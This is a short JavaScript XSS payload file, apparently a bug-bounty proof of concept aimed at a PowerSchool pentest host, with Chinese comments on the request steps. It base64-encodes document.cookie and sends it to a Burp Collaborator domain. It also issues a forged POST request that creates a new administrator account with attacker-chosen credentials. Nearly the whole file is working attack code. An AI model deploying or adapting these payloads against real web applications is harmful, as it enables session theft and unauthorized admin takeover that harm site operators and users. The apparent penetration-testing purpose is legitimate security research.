alert(document.cookie);
alert(document.domain);
function stealCookies(){
  const url = 'https://kc0uextit85igfq9a8t1015ei5ovck.burpcollaborator.net/?cookies=' + btoa(document.cookie)
  const response = fetch(url)
}

function getCookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return "";
}


// add new administrator account
var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
httpRequest.open('POST', 'https://pentest.sfe.powerschool.com/profileMainAction.do', true); //第二步：打开连接
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头(在建立连接后设置请求头)
httpRequest.send('employeeSearchId=&accessIdStr=9998&webPassword=Attacker%40powerschool.com&lastName=Stone&firstName=John&email=johnstone%40wearehackerone.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=2126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=10031&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&activeAdm=on&calendarId=-99&disableJobShopping=false&callBackNumber=&submitInsert=Save');//发送请求 将情头体写在send中

stealCookies();
